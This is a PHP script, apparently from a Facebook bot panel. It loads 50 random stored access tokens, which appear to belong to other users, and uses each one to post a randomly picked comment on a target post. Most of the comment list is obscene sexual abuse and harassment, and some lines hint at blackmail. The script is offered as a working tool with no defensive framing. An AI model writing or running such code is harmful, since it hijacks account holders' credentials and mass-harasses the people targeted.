<?php
require 'facebook.php';


include('config.php');


//database connect
mysql_connect($host,$username,$password) or die(mysql_error());
mysql_select_db($dbname) or die(mysql_error());
mysql_query("SET NAMES utf8");
 
//Create facebook application instance.
$facebook = new Facebook(array(
  'appId'  => $fb_app_id,
  'secret' => $fb_secret
));
 
$output = '';
 
 
 
 
 
//get users and try liking
$result = mysql_query("
SELECT
*
FROM
token_all Order By Rand() Limit 50
");
   if($result){
      while($row = mysql_fetch_array($result, MYSQL_ASSOC)){
                        $m = $row['token'];
                        $facebook->setAccessToken ($m);
                        $id = trim($_POST ['id']);
                try {
$ayat1  = $_POST["komen1"];
$ayat2  = $_POST["komen2"];
$ayat3  = $_POST["komen3"];
$ayat4  = $_POST["komen4"];
$ayat5  = $_POST["komen5"];
$ayat6  = $_POST["komen6"];
$ayat7  = $_POST["komen7"];
 
 
 
 $taz = array("You MotherFucker >:O ",
"Fuck you!!",
"Sucks -_-  ",
"Gay!! Suck my _|_ ",
"Biggest MotherFucker Ever -_- ",
"Great Get Fucked!",
"Biggest cum dumpster!! ",
"suck a fat baby's dick :P ",
"I like your fuck hole :* ",
"please accept my dick!! ",
"fuck your sister!!",
"fuck your family :D ",
" You have biggest OZONE HOLE!! ",
" I wanna stick my cock in your cunt hole and fuck it like crazy! ",
"A-CLASS Motherfucker :D",
"Bitch!! ",
":( Inbox Plz.. Need Some Pussies!! :( ",
"You are Great :D 3:) ",
"Please Get In Fast :( ",
" awesome MFucker :3 ",
"World's Greatest ------ :)",
"Love your mother!! ",
"come on baby!! lets go in Dog Position!! ",
"cutest pussy :* ",
"no reply???",
"Pornstar hehe :D",
"Dude i am still waiting for your sister!! :'( ",
"today i fucked your mother!! wow!! awesome!! :) ",
"should i show that pic to all???? ",
"No dude i have full video :D <3 ",
" :D ",
"wow show your asshole :3 :) ",
"oops its of 4Inches :D ",
"lots of fuckers!! ",
"real beauty :3 ",
"you are great man..",
"plxxxxxx accept my request :( ",
"fuckin awesome :O ");
$sinta = $taz[array_rand($taz)];
 
 
 
  
 
 
 
 
 
 
 
 
 
 
                        $facebook->api("/".$id."/comments",'post',array('message' => $sinta));
      }
           catch (FacebookApiException $e) {
            $output .= "<p>'". $row['name'] . "' failed to like.</p>";
         }
}
}
 
 
 
 
 
 
 
 
?>
<!DOCTYPE html 
   PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="et" lang="en">
   <head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
     <title>Done</title>
<link rel="shortcut icon" href="http://Tsm48.tk/indonesia" />

      
     <link rel='stylesheet' href='style.css' type='text/css' />
   </head>
   <body>
<div align="center"><h2>Done! </h2><br/><br/>

</center>
</div>
   </body>
</html>